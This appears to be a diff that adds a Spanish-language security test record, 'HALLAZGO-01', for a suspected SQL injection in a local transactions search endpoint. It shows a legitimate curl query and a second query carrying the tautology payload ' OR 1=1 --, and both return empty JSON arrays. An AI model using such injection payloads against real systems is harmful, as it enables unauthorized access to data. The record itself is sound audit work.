@@ -1,0 +1,28 @@
+# HALLAZGO-01 - SQL Injection en /api/transacciones/buscar
+Fecha de ejecucion: 2026-11-17 09:37:44
+
+### Busqueda legitima (termino=alquiler)
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=alquiler" -H "Authorization: Bearer <TOKEN_CARLOS>"
+
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Tue, 17 Nov 2026 15:37:44 GMT
+
+[]
+
+### Payload tautologico (termino=' OR 1=1 --)
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=' OR 1=1 --" -H "Authorization: Bearer <TOKEN_CARLOS>"
+
+HTTP/1.1 200 
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Tue, 17 Nov 2026 15:37:44 GMT
+
+[]
